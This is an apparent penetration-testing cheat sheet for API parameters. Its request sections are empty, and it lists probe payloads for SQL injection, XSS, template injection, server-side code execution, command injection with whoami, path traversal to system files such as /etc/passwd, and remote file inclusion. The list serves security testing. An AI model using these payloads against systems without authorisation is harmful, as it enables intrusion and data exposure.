# APIs and Fields

## Simulating Requests

### GET

```
// Some code
```

### POST - HTTP Params

```
// Some code
```

### POST - JSON



## Testing parameters

SQL Injection

```
''""``) or 'a' = 1;

sleep(5)#
or sleep(5)#
;waitfor delay '0:0:5'--
" or pg_sleep(5)--
```

XSS

```
<script>alert(document.domain)</script>
<img src=1 href=1 onerror="javascript:alert(document.domain)"></img>

`"'><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
/><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
```

Template Injection

```
4*4
{{4*4}}
${4*4}
{4*4}
<%= 4*4 %>
```

Code Execution - Server

```
os.system('<cmd>')
T(java.lang.Runtime).getRuntime().exec("<cmd>");

echo exec("<cmd>");
echo `<cmd>`;

<!--#exec cmd="<cmd>" --> 
```

Code Execution - Machine

```
whoami
$(whoami)
;whoami
||whoami
&&whoami
```

Local File Inclusion

```
../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\Windows\system.ini
..\..\..\..\..\..\..\..\..\boot.ini
```

Remote File Inclusion

```
http://www.google.com
http://<controlled ip>
```

